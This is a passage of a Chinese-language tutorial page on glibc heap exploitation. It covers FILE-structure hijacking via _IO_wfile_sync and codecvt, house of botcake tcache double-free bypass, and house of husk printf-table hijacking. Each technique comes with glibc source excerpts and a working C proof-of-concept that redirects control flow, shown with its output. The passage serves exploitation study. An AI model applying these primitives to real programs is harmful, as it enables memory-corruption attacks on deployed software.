0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>rsi</code>为<code>&amp;codecvt-&gt;__cd_in.step_data</code>可控。</li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_sync</span><br><span class="line">    __libio_codecvt_length</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>直接看<code>_IO_wfile_sync</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">wint_t</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="comment">// 不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (fp))</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  <span class="comment">// 需要进入到这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out how many bytes we have to go back in the</span></span><br><span class="line"><span class="comment">     external buffer.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">      <span class="type">off64_t</span> new_pos;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 这里直接返回-1即可</span></span><br><span class="line">      <span class="type">int</span> clen = __libio_codecvt_encoding (cv);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (clen &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* It is easy, a fixed number of input bytes are used for each</span></span><br><span class="line"><span class="comment">       wide character.  */</span></span><br><span class="line">    delta *= clen;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out the hard way how much to back off.</span></span><br><span class="line"><span class="comment">         To do this we determine how much input we needed to</span></span><br><span class="line"><span class="comment">         generate the wide characters up to the current reading</span></span><br><span class="line"><span class="comment">         position.  */</span></span><br><span class="line">      <span class="type">int</span> nread;</span><br><span class="line">      <span class="type">size_t</span> wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr</span><br><span class="line">               - fp-&gt;_wide_data-&gt;_IO_read_base);</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;</span><br><span class="line">    <span class="comment">// 调用到这里</span></span><br><span class="line">      nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                      fp-&gt;_IO_read_base,</span><br><span class="line">                      fp-&gt;_IO_read_end, wnread);</span><br><span class="line">            <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base</code>和<code>fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0</code>。</p><p>然后看下<code>__libio_codecvt_encoding</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libio_codecvt_encoding (<span class="keyword">struct</span> _IO_codecvt *codecvt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* See whether the encoding is stateful.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__stateful)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">/* Fortunately not.  Now determine the input bytes for the conversion</span></span><br><span class="line"><span class="comment">     necessary for each wide character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__min_needed_from</span><br><span class="line">      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)</span><br><span class="line">    <span class="comment">/* Not a constant value.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> codecvt-&gt;__cd_in.step-&gt;__min_needed_from;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接设置<code>fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0</code>即可返回<code>-1</code>。</p><h2 id="示例-6"><a href="#示例-6" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m[!] Backdoor is called!\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *)puts_addr);</span><br><span class="line">    <span class="type">size_t</span> libc_base_addr = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="type">void</span> *)libc_base_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x1ed5c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_wfile_jumps_addr = libc_base_addr + <span class="number">0x1e8f60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wfile_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wfile_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: set stderr-&gt;_flags to ~(4 | 0x10))&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr2 = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: set stderr-&gt;_IO_read_ptr &lt; stderr-&gt;_IO_read_end&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0x10</span>) = (<span class="type">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: set stderr-&gt;vtable to _IO_wfile_jumps-0x40&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wfile_jumps_addr<span class="number">-0x40</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: set stderr-&gt;codecvt with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0x98</span>) = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;codecvt-&gt;__cd_in.step with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)p1 = (<span class="type">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: put backdoor at stderr-&gt;codecvt-&gt;__cd_in.step-&gt;__fct&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p2 + <span class="number">0x28</span>) = (<span class="type">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] allocate two <span class="number">0x200</span> chunks</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f3b2d0a2420</span></span><br><span class="line">[*] libc base address: <span class="number">0x7f3b2d01e000</span></span><br><span class="line">[*] _IO_2_1_stderr_ address: <span class="number">0x7f3b2d20b5c0</span></span><br><span class="line">[*] _IO_wfile_jumps address: <span class="number">0x7f3b2d206f60</span></span><br><span class="line">[+] step <span class="number">1</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_flags to ~(<span class="number">4</span> | <span class="number">0x10</span>))</span><br><span class="line">[+] step <span class="number">2</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_IO_read_ptr &lt; <span class="built_in">stderr</span>-&gt;_IO_read_end</span><br><span class="line">[+] step <span class="number">3</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;vtable to _IO_wfile_jumps<span class="number">-0x40</span></span><br><span class="line">[+] step <span class="number">4</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;codecvt with the allocated chunk p1</span><br><span class="line">[+] step <span class="number">5</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;codecvt-&gt;__cd_in.step with the allocated chunk p2</span><br><span class="line">[+] step <span class="number">6</span>: put backdoor at <span class="built_in">stderr</span>-&gt;codecvt-&gt;__cd_in.step-&gt;__fct</span><br><span class="line">[+] step <span class="number">7</span>: call <span class="title function_">fflush</span><span class="params">(<span class="built_in">stderr</span>)</span> to trigger backdoor func</span><br><span class="line">[!] Backdoor is called!</span><br></pre></td></tr></table></figure><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h1><h2 id="概要-17"><a href="#概要-17" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>绕过新版本glibc的tcache-&gt;key验证</p><p><strong>利用条件:</strong></p><ol><li>uaf</li></ol><p><strong>利用效果:</strong>double free</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-17"><a href="#原理-17" class="headerlink" title="原理"></a>原理</h2><p>当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 <code>key == tcache_key</code> ， 就会遍历<strong>这个大小</strong>的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。</p><p>从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：</p><ol><li>破坏掉被 free 的堆块中的 key,绕过检查</li><li>改变被 free 的堆块的大小，遍历时进入另一 idx 的 tc_entries</li><li><strong>House of botcake</strong></li></ol><p>House of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。</p><p>此外 House of botcake 在条件合适的情况下，极其容易完成多次任意分配堆块，是相当好用的手法。</p><p>简单来说就是一个chunkA,</p><p>其所属的tcache在第一次free时为满状态,使得其进入了unsortedbin</p><p>之后取出tcache中的chunk使其不满,在释放A使其进入tcache,达到double free</p><h2 id="示例-7"><a href="#示例-7" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed into tcache</span></span><br><span class="line">   </span><br><span class="line">    <span class="type">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="type">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    </span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">    assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h1><h2 id="概要-18"><a href="#概要-18" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>利用printf的自定义格式化字符串</p><p><strong>利用条件:</strong></p><ol><li>能向 <code>__printf_function_table</code> 中写入任意数据，使其不为空</li><li>能向 <code>__printf_arginfo_table</code> 中写入一个可控地址让 <code>__printf_arginfo_table[spec]</code> 为 <code>backdoor</code> 地址</li></ol><p><strong>利用效果:</strong>程序流执行</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-18"><a href="#原理-18" class="headerlink" title="原理"></a>原理</h2><p>首先要先认识下 <code>__register_printf_function</code> 函数,该函数的作用是允许用户自定义格式化字符并进行注册（注册的意思是说将自定义格式化字符与相应的处理函数相关联），以打印用户自定义数据类型的数据。</p><p><code>__register_printf_function</code> 函数是对 <code>__register_printf_specifier</code> 进行的封装，下面是 <code>__register_printf_specifier</code> 的源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be called to format SPEC specifiers.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line"><span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>spec是自定义的格式化字符（以 <code>ASCII</code> 所表示），比如你使用 <code>%a</code> 这个格式化字符来输出自定义的数据类型，那么 <code>spec</code> 就是字符 `a’</p><p>上面的代码先做了第一个 <code>if</code> 判断，要确定 <code>spec</code> 位于 <code>0</code> 和 <code>0xff</code> 之间，如果不在 <code>ASCII</code> 码就会返回 <code>-1</code></p><p>第二个判断是如果 <code>__printf_function_table</code> 为空，那么就通过 <code>calloc</code> 来分配两个索引表，并将地址存放到 <code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code> 中。两个表的大小都为 <code>0x100</code> ，可以给 <code>0~0xff</code> 的每个字符注册一个函数指针（假设我定义一个 <code>%X</code> 的格式化字符，那么 <code>spec</code> 就是 <code>88</code> ，所以将 <code>__printf_arginfo_table[88]</code> 此处存放一个对应处理函数的指针）</p><p><strong>需要注意的是，接下来的利用并不会调用到上面这个函数，但需要用到这个注册自定义格式化字符的前置知识。</strong></p><p><code>printf</code> 函数调用了 <code>vfprintf</code> 函数，下面的代码是 <code>vprintf</code> 函数中的部分片段，可以看出来如果 <code>__printf_function_table</code> 不为空（也就意味着有自定义格式化字符被注册过了）那么就会调用 <code>printf_positional</code> 函数,如果为空的话，就会去执行默认格式化字符的代码部分（因此<strong>检查自定义的格式化字符是优先于默认的格式化字符</strong>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">    save_errno, grouping, thousands_sep);</span><br></pre></td></tr></table></figure><p>而 <code>printf_positional</code> 函数中会调用 <code>__parse_one_specmb</code> 函数</p><p><code>__parse_one_specmb</code> 函数中最关键的就是下面这个片段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>可以看到最后执行了 <code>(*__printf_arginfo_table[spec-&gt;info.spec])</code> 这里本应是注册的正常的函数指针，但如果我们能够篡改 <code>__printf_arginfo_table</code> 中存放的地址，将其改为我们可控的内存地址，这样我只需要在 <code>__printf_arginfo_table[88]</code> （以 <code>%X</code> 为例）的位置存放一个 <code>one_gadget</code> 的地址，执行到函数指针指向的位置即可跳转到 控制函数中</p><p><strong>注意：上面的利用始终都没有注册自定义的格式化字符，而是通过直接篡改 <code>__printf_function_table</code> 来错让程序以为存在注册过的自定义格式化字符，从而触发 <code>__printf_arginfo_table</code> 中的函数指针</strong></p><h2 id="示例-8"><a href="#示例-8" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 